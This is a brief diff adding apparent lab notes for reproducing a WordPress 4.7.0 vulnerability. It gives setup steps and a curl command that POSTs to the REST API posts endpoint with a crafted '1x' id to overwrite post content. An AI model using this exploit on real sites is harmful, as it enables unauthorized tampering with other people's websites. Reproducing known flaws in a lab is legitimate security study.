@@ -1,0 +1,14 @@
+#exploit wordpress4.7.0
+#usage
+setting apache2,mariaDB
+install PHP
+create wordpressDB
+download&setting wordpress
+
+#point!
+setting wordpress/admin
+ allowoverride none → all
+
+#exploit
+$ curl http://{host}/wp-json/wp/v2/posts/1/?id=1x -X POST --data 'free'
+
